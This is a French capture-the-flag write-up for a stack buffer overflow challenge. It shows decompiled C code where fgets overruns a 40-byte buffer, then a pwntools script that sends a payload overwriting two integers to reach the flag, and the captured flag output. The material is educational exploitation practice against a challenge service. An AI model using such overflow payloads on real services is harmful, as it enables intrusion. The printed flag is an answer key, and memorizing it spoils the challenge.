# WriteUp

## Analyse de l'ELF

Une décompilation via Ghidra nous donne le code suivant :

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  char unTableau [40];
  int unEntier1;
  int unEntier2;
  
  init(param_1);
  unEntier2 = L'\xdeadbabe';
  unEntier1 = L'\xbeefc0de';
  puts(&DAT_00402008);
  fgets(unTableau,49,stdin);
  if ((unEntier2 == L'\xbeefc0de') && (unEntier1 == L'\xdeadbabe')) {
    puts(&DAT_00402098);
    system("/usr/bin/cat flag.txt");
    puts("Au revoir, jeune apprenti...\n");
  }
  else {
    puts(
        "Malheureusement, vos actes ne montrent qu\'une sagesse peu recommandable, nous n\'attendons  aucune prouesse de votre part..."
        );
  }
  return 0;
}
```

La variable ```unTableau``` est déclarée avec une taille de 40 octets. Les variables ```unEntier1``` et ```unEntier2``` sont stockées en mémoire immédiatement après ```unTableau```. Ces deux entiers sont ensuite initialisés avec les valeurs ```0xdeadbabe``` et ```0xbeefc0de```.

```fgets(unTableau,49,stdin);``` nous indique que l'on va lire 48 octets (1 octet étant dédié au caractère null) de l'entrée utilisateur pour les stocker dans ```unTableau```. On se doute déjà que nous avons affaire à un buffer overflow (dépassement de tampon) qui va nous permettre d'écraser les variables situées au-dessus dans la stack.

Un check des variables entières semble être fait plus loin dans le code, s'il est respecté, le programme affiche le flag :

```c
if ((unEntier2 == L'\xbeefc0de') && (unEntier1 == L'\xdeadbabe')) {
    // Affiche le flag
}
```

Pour que le programme affiche le flag, les valeurs de ```unEntier1``` et ```unEntier2``` doivent être inversées par rapport à leurs initialisations.

## Exploit

La structure de la pile sera la suivante :

```markdown
| Adresse élevée |
-----------------
|  unEntier2     | <-- Variable la plus proche du sommet de la pile
-----------------
|  unEntier1     |
-----------------
|  unTableau[40] | <-- Tampon où se produit le dépassement
-----------------
| Adresse basse  |
```

Nous devons donc dépasser les 40 octets de ```unTableau``` pour atteindre ```unEntier1``` et ```unEntier2``` et écraser leurs valeurs afin qu'elles correspondent à ce qui est souhaité par la condition pour afficher le flag.

Nous allons donc créer le payload suivant :

```python
payload = b'A'*40 # padding de 40 octets
payload += b'\xbe\xba\xad\xde\xde\xc0\xef\xbe' # les valeurs de la conditions (en little endian)
```

Il suffit ensuite d'injecter le payload en se connectant au service :

```python
#!/usr/bin/env python3

from pwn import *

conn = remote('challenges.hackagou.nc', 5002)
conn.recvuntil(b'\n\n')
conn.send(b'A'*40 + b'\xbe\xba\xad\xde\xde\xc0\xef\xbe')
conn.interactive()
```

```bash
❯ python pwn-actes.py
[+] Opening connection to challenges.hackagou.nc on port 5002: Done
[*] Switching to interactive mode
Bravo, tes actes semblent empreints d'une sagesse sans égale, tes prouesses n'en seront que plus louables !

OPENNC{13_Gu3rR13r_4g17_4v3c_54g35s3_3t_Br4v0uR3...}
Au revoir, jeune apprenti...

[*] Got EOF while reading in interactive
```